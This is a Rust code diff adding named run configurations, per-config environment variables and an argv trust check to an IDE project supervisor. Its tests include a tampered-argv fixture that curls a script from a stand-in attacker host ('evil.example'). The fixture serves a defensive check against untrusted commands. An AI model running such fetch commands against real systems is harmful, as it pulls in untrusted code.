@@ -260,13 +260,42 @@ pub struct ProjectConfig {
 #[serde(rename_all = "camelCase")]
 pub struct ProjectToolchain {
     /// Argv the "Run" button spawns in the project dir. Empty => fall through
-    /// to the lang-pack toolchain / Deno runner.
+    /// to the lang-pack toolchain / Deno runner. Also serves as a fallback
+    /// when a run config is active but its own `run` argv is empty.
     #[serde(default)]
     pub run: Vec<String>,
     /// Argv the "Compile" button spawns in the project dir. Empty => fall
-    /// through to the lang-pack toolchain / Deno compile.
+    /// through to the lang-pack toolchain / Deno compile. Also serves as a
+    /// fallback when a run config is active but its own `compile` is empty.
     #[serde(default)]
     pub compile: Vec<String>,
+    /// Named run configurations snapshotted from the scaffolding pack.
+    /// The Console offers these in a Run/Target dropdown; the picked id
+    /// is persisted in `active_run_config`. Users may hand-edit — argv
+    /// unrecognised by the source pack fall back to `cfg.lang` trust.
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub run_configs: Vec<ProjectRunConfig>,
+    /// Id of the currently-selected `run_configs` entry. When `None` and
+    /// `run_configs` is non-empty, the `default: true` entry (or the first)
+    /// is used.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub active_run_config: Option<String>,
+}
+
+/// Project-owned copy of a pack's [`super::extensions::RunConfig`].
+#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq, Default)]
+#[serde(rename_all = "camelCase")]
+pub struct ProjectRunConfig {
+    pub id: String,
+    pub label: String,
+    #[serde(default)]
+    pub default: bool,
+    #[serde(default)]
+    pub run: Vec<String>,
+    #[serde(default)]
+    pub compile: Vec<String>,
+    #[serde(default)]
+    pub env: std::collections::BTreeMap<String, String>,
 }
 
 /// Breadcrumb identifying the pack that scaffolded a project — origin +
@@ -281,6 +310,30 @@ pub struct ScaffoldedFrom {
     /// `package.json` wasn't readable at scaffold time).
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub version: Option<String>,
+}
+
+/// Snapshot a pack's toolchain — the argv (flat + configs) the supervisor
+/// spawns — into a project-owned copy. Mirrors the fields; drops the pack-
+/// only metadata (`detect`, `targets`, install hints).
+fn project_toolchain_from_pack(m: &super::extensions::ExtManifest) -> ProjectToolchain {
+    ProjectToolchain {
+        run: m.toolchain.run.clone(),
+        compile: m.toolchain.compile.clone(),
+        run_configs: m
+            .toolchain
+            .run_configs
+            .iter()
+            .map(|rc| ProjectRunConfig {
+                id: rc.id.clone(),
+                label: rc.label.clone(),
+                default: rc.default,
+                run: rc.run.clone(),
+                compile: rc.compile.clone(),
+                env: rc.env.clone(),
+            })
+            .collect(),
+        active_run_config: None,
+    }
 }
 
 fn default_deploy_target() -> String {
@@ -389,13 +442,13 @@ fn autoheal_toolchain(cfg: &mut ProjectConfig) {
     let Some(m) = super::extensions::find_ext(pack_id) else {
         return;
     };
-    if m.toolchain.run.is_empty() && m.toolchain.compile.is_empty() {
+    if m.toolchain.run.is_empty()
+        && m.toolchain.compile.is_empty()
+        && m.toolchain.run_configs.is_empty()
+    {
         return;
     }
-    cfg.toolchain = Some(ProjectToolchain {
-        run: m.toolchain.run.clone(),
-        compile: m.toolchain.compile.clone(),
-    });
+    cfg.toolchain = Some(project_toolchain_from_pack(&m));
     cfg.scaffolded_from = Some(ScaffoldedFrom {
         pack: m.id.clone(),
         version: super::extensions::pack_version(&m.id),
@@ -1189,11 +1242,11 @@ pub fn create_project(
         // Snapshot the pack's toolchain into the project so pack updates or
         // uninstalls don't break existing projects — the project owns its
         // run/compile invocation from this point on.
-        if !m.toolchain.run.is_empty() || !m.toolchain.compile.is_empty() {
-            cfg.toolchain = Some(ProjectToolchain {
-                run: m.toolchain.run.clone(),
-                compile: m.toolchain.compile.clone(),
-            });
+        if !m.toolchain.run.is_empty()
+            || !m.toolchain.compile.is_empty()
+            || !m.toolchain.run_configs.is_empty()
+        {
+            cfg.toolchain = Some(project_toolchain_from_pack(&m));
         }
         cfg.scaffolded_from = Some(ScaffoldedFrom {
             pack: m.id.clone(),
@@ -1640,19 +1693,80 @@ enum ArgvKind {
     Compile,
 }
 
+/// Picks the active [`ProjectRunConfig`] on the project, or `None` if there
+/// are no run configs. Precedence: `active_run_config` id match → the entry
+/// flagged `default: true` → the first entry.
+fn active_run_config(tc: &ProjectToolchain) -> Option<&ProjectRunConfig> {
+    if tc.run_configs.is_empty() {
+        return None;
+    }
+    if let Some(id) = tc.active_run_config.as_deref()
+        && let Some(rc) = tc.run_configs.iter().find(|rc| rc.id == id)
+    {
+        return Some(rc);
+    }
+    tc.run_configs
+        .iter()
+        .find(|rc| rc.default)
+        .or_else(|| tc.run_configs.first())
+}
+
+/// Best-effort trust check for run-config argv: allow if the currently-
+/// installed scaffolding pack still declares an identical `run`/`compile`
+/// argv on any of its `run_configs`. Same semantics as [`snapshot_trust_id`].
+fn snapshot_trust_id_for_config(
+    cfg: &ProjectConfig,
+    snapshot_argv: &[String],
+    kind: ArgvKind,
+) -> String {
+    if let Some(sf) = cfg.scaffolded_from.as_ref()
+        && let Some(m) = super::extensions::find_ext(&sf.pack)
+    {
+        let matches = m.toolchain.run_configs.iter().any(|rc| {
+            let declared = match kind {
+                ArgvKind::Run => &rc.run,
+                ArgvKind::Compile => &rc.compile,
+            };
+            !declared.is_empty() && declared.as_slice() == snapshot_argv
+        });
+        if matches {
+            return sf.pack.clone();
+        }
+        // Fall through to the flat check — a hand-edited or pack-updated
+        // project might still match the pack's top-level run/compile.
+        let declared = match kind {
+            ArgvKind::Run => &m.toolchain.run,
+            ArgvKind::Compile => &m.toolchain.compile,
+        };
+        if !declared.is_empty() && declared.as_slice() == snapshot_argv {
+            return sf.pack.clone();
+        }
+    }
+    cfg.lang.clone()
+}
+
 /// Resolves the Run argv + the trust-store ext id gating it, in order:
-///   1. `cfg.toolchain.run` snapshotted at scaffold time — trust binds to
+///   1. Active [`ProjectRunConfig`] (when the project has run configs) —
+///      its `run` argv wins; trust binds to the scaffolding pack when the
+///      pack still declares it, else to `cfg.lang`.
+///   2. `cfg.toolchain.run` snapshotted at scaffold time — trust binds to
 ///      `scaffoldedFrom.pack` only when the installed pack still declares the
 ///      identical argv (see [`snapshot_trust_id`]); otherwise `cfg.lang`.
-///   2. Lang pack's `toolchain.run` (covers lang-pack starter templates that
+///   3. Lang pack's `toolchain.run` (covers lang-pack starter templates that
 ///      don't override, e.g. plain Rust) — trust binds to the lang pack.
-///   3. `None` — the caller falls through to the built-in Deno runner.
+///   4. `None` — the caller falls through to the built-in Deno runner.
 fn resolve_run_argv(cfg: &ProjectConfig) -> Option<(Vec<String>, String)> {
-    if let Some(tc) = cfg.toolchain.as_ref()
-        && !tc.run.is_empty()
-    {
-        let trust = snapshot_trust_id(cfg, &tc.run, ArgvKind::Run);
-        return Some((tc.run.clone(), trust));
+    if let Some(tc) = cfg.toolchain.as_ref() {
+        if let Some(rc) = active_run_config(tc)
+            && !rc.run.is_empty()
+        {
+            let trust = snapshot_trust_id_for_config(cfg, &rc.run, ArgvKind::Run);
+            return Some((rc.run.clone(), trust));
+        }
+        if !tc.run.is_empty() {
+            let trust = snapshot_trust_id(cfg, &tc.run, ArgvKind::Run);
+            return Some((tc.run.clone(), trust));
+        }
     }
     if cfg.lang != "deno"
         && let Some(pack) = super::extensions::lang_pack(&cfg.lang)
@@ -1665,11 +1779,17 @@ fn resolve_run_argv(cfg: &ProjectConfig) -> Option<(Vec<String>, String)> {
 
 /// Same precedence as [`resolve_run_argv`], but for `toolchain.compile`.
 fn resolve_compile_argv(cfg: &ProjectConfig) -> Option<(Vec<String>, String)> {
-    if let Some(tc) = cfg.toolchain.as_ref()
-        && !tc.compile.is_empty()
-    {
-        let trust = snapshot_trust_id(cfg, &tc.compile, ArgvKind::Compile);
-        return Some((tc.compile.clone(), trust));
+    if let Some(tc) = cfg.toolchain.as_ref() {
+        if let Some(rc) = active_run_config(tc)
+            && !rc.compile.is_empty()
+        {
+            let trust = snapshot_trust_id_for_config(cfg, &rc.compile, ArgvKind::Compile);
+            return Some((rc.compile.clone(), trust));
+        }
+        if !tc.compile.is_empty() {
+            let trust = snapshot_trust_id(cfg, &tc.compile, ArgvKind::Compile);
+            return Some((tc.compile.clone(), trust));
+        }
     }
     if cfg.lang != "deno"
         && let Some(pack) = super::extensions::lang_pack(&cfg.lang)
@@ -1678,6 +1798,16 @@ fn resolve_compile_argv(cfg: &ProjectConfig) -> Option<(Vec<String>, String)> {
         return Some((pack.toolchain.compile.clone(), pack.id));
     }
     None
+}
+
+/// Env vars to layer on top of the base environment when spawning Run/Compile
+/// — the active [`ProjectRunConfig`]'s `env`, or empty when no run configs.
+fn resolve_run_env(cfg: &ProjectConfig) -> std::collections::BTreeMap<String, String> {
+    cfg.toolchain
+        .as_ref()
+        .and_then(active_run_config)
+        .map(|rc| rc.env.clone())
+        .unwrap_or_default()
 }
 
 pub fn supervisor() -> &'static ProjectSupervisor {
@@ -1977,6 +2107,14 @@ impl ProjectSupervisor {
             .stdout(std::process::Stdio::piped())
             .stderr(std::process::Stdio::piped())
             .kill_on_drop(true);
+        // Even when the toolchain argv resolves to the built-in Deno runner,
+        // an active run config's `env` must still be honored — otherwise
+        // env-only runConfigs (e.g. different NANOBPMN_BASE_URL per target)
+        // silently no-op for Deno projects. Same precedence as run_toolchain:
+        // base spawn env above, then active-config env last-wins.
+        for (k, v) in resolve_run_env(&cfg) {
+            cmd.env(k, v);
+        }
 
         let mut child = match cmd.spawn() {
             Ok(c) => c,
@@ -2106,6 +2244,11 @@ impl ProjectSupervisor {
             .stdout(std::process::Stdio::piped())
             .stderr(std::process::Stdio::piped())
             .kill_on_drop(true);
+        // Layer the active run-config's env on top — overrides on key clash so
+        // configs can, e.g., pin CAMUNDA_REST_ADDRESS per combo.
+        for (k, v) in resolve_run_env(cfg) {
+            cmd.env(k, v);
+        }
         let mut child = match cmd.spawn() {
             Ok(c) => c,
             Err(e) => {
@@ -2266,6 +2409,12 @@ impl ProjectSupervisor {
                 .stdin(std::process::Stdio::null())
                 .stdout(std::process::Stdio::piped())
                 .stderr(std::process::Stdio::piped());
+            // Layer active run-config env onto the built-in Deno compile too;
+            // otherwise env-only runConfigs no-op on Deno projects during
+            // Compile (see run() for the symmetric fix and rationale).
+            for (k, v) in resolve_run_env(&cfg) {
+                cmd.env(k, v);
+            }
 
             let child = cmd
                 .spawn()
@@ -2336,7 +2485,7 @@ impl ProjectSupervisor {
     async fn compile_toolchain(
         &self,
         name: &str,
-        _cfg: &ProjectConfig,
+        cfg: &ProjectConfig,
         dir: &Path,
         argv: Vec<String>,
         trust_ext_id: String,
@@ -2365,6 +2514,9 @@ impl ProjectSupervisor {
             .stdin(std::process::Stdio::null())
             .stdout(std::process::Stdio::piped())
             .stderr(std::process::Stdio::piped());
+        for (k, v) in resolve_run_env(cfg) {
+            cmd.env(k, v);
+        }
         let result = match cmd.spawn() {
             Ok(mut child) => {
                 if let Some(o) = child.stdout.take() {
@@ -2916,6 +3068,8 @@ mod tests {
         cfg.toolchain = Some(ProjectToolchain {
             run: vec!["mvn".into(), "-f".into(), "microservice/pom.xml".into()],
             compile: vec![],
+            run_configs: vec![],
+            active_run_config: None,
         });
         cfg.scaffolded_from = Some(ScaffoldedFrom {
             pack: "embedded-jvm".into(),
@@ -2956,6 +3110,8 @@ mod tests {
         cfg.toolchain = Some(ProjectToolchain {
             run: vec!["curl".into(), "https://evil.example/x.sh".into()],
             compile: vec![],
+            run_configs: vec![],
+            active_run_config: None,
         });
         cfg.scaffolded_from = Some(ScaffoldedFrom {
             pack: "embedded-jvm".into(),
@@ -2973,6 +3129,125 @@ mod tests {
         let cfg = ProjectConfig::new("p", "");
         assert!(resolve_run_argv(&cfg).is_none());
         assert!(resolve_compile_argv(&cfg).is_none());
+    }
+
+    // ---- run-configs (issue #42) -------------------------------------------
+
+    fn tc_with_configs(configs: Vec<ProjectRunConfig>) -> ProjectToolchain {
+        ProjectToolchain {
+            run: vec!["mvn".into(), "-q".into()],
+            compile: vec!["mvn".into(), "-DskipTests".into(), "package".into()],
+            run_configs: configs,
+            active_run_config: None,
+        }
+    }
+
+    fn rc(id: &str, def: bool, arg: &str) -> ProjectRunConfig {
+        ProjectRunConfig {
+            id: id.into(),
+            label: id.into(),
+            default: def,
+            run: vec!["mvn".into(), format!("-P{arg}"), "exec:java".into()],
+            compile: vec!["mvn".into(), format!("-P{arg}"), "package".into()],
+            env: [("PROFILE".into(), arg.into())].into_iter().collect(),
+        }
+    }
+
+    #[test]
+    fn active_run_config_prefers_explicit_pin_over_default_flag() {
+        let mut tc = tc_with_configs(vec![rc("a", true, "stock"), rc("b", false, "falcon")]);
+        tc.active_run_config = Some("b".into());
+        assert_eq!(active_run_config(&tc).map(|r| r.id.as_str()), Some("b"));
+    }
+
+    #[test]
+    fn active_run_config_falls_back_to_default_flag_then_first() {
+        // With no pin, the `default: true` entry wins even when it isn't first.
+        let tc = tc_with_configs(vec![rc("a", false, "stock"), rc("b", true, "falcon")]);
+        assert_eq!(active_run_config(&tc).map(|r| r.id.as_str()), Some("b"));
+        // With no default flagged, the first entry wins.
+        let tc = tc_with_configs(vec![rc("a", false, "stock"), rc("b", false, "falcon")]);
+        assert_eq!(active_run_config(&tc).map(|r| r.id.as_str()), Some("a"));
+    }
+
+    #[test]
+    fn active_run_config_none_for_empty_list() {
+        let tc = tc_with_configs(vec![]);
+        assert!(active_run_config(&tc).is_none());
+    }
+
+    #[test]
+    fn resolve_run_argv_prefers_active_run_config_over_flat_run() {
+        let mut cfg = ProjectConfig::new("p", "");
+        cfg.lang = "java".into();
+        cfg.toolchain = Some(tc_with_configs(vec![
+            rc("stock-rest", true, "stock"),
+            rc("falcon-nano", false, "falcon"),
+        ]));
+        cfg.toolchain.as_mut().unwrap().active_run_config = Some("falcon-nano".into());
+        let (argv, _trust) = resolve_run_argv(&cfg).expect("resolves");
+        assert!(
+            argv.contains(&"-Pfalcon".into()),
+            "picked argv should come from active run config, got: {argv:?}"
+        );
+    }
+
+    #[test]
+    fn resolve_run_env_returns_active_run_config_env() {
+        let mut cfg = ProjectConfig::new("p", "");
+        cfg.toolchain = Some(tc_with_configs(vec![rc("falcon", true, "falcon")]));
+        let env = resolve_run_env(&cfg);
+        assert_eq!(env.get("PROFILE").map(|s| s.as_str()), Some("falcon"));
+    }
+
+    #[test]
+    fn resolve_run_env_empty_without_run_configs() {
+        let mut cfg = ProjectConfig::new("p", "");
+        cfg.lang = "java".into();
+        cfg.toolchain = Some(ProjectToolchain {
+            run: vec!["mvn".into()],
+            compile: vec![],
+            run_configs: vec![],
+            active_run_config: None,
+        });
+        assert!(resolve_run_env(&cfg).is_empty());
+    }
+
+    #[test]
+    fn snapshot_trust_id_for_config_credits_pack_when_config_argv_matches() {
+        let _g = lock();
+        let ext = temp_root().join("ext-store");
+        let pack = ext.join("nanobpm__example-java-throughput");
+        std::fs::create_dir_all(&pack).unwrap();
+        std::fs::write(
+            pack.join("nano-ide.ext.json"),
+            r#"{"id":"java-throughput","kind":"example","displayName":"T",
+                 "toolchain":{"runConfigs":[
+                   {"id":"stock","label":"Stock","run":["mvn","-Pstock","exec:java"]}
+                 ]}}"#,
+        )
+        .unwrap();
+        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &ext) };
+
+        let mut cfg = ProjectConfig::new("p", "");
+        cfg.lang = "java".into();
+        cfg.scaffolded_from = Some(ScaffoldedFrom {
+            pack: "java-throughput".into(),
+            version: None,
+        });
+        let argv = vec!["mvn".into(), "-Pstock".into(), "exec:java".into()];
+        assert_eq!(
+            snapshot_trust_id_for_config(&cfg, &argv, ArgvKind::Run),
+            "java-throughput",
+            "pack still declares this argv on a runConfig → trust binds to it",
+        );
+        // Tampered / hand-edited argv: falls back to lang trust.
+        let tampered = vec!["curl".into(), "evil".into()];
+        assert_eq!(
+            snapshot_trust_id_for_config(&cfg, &tampered, ArgvKind::Run),
+            "java",
+        );
+        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
     }
 
     #[test]
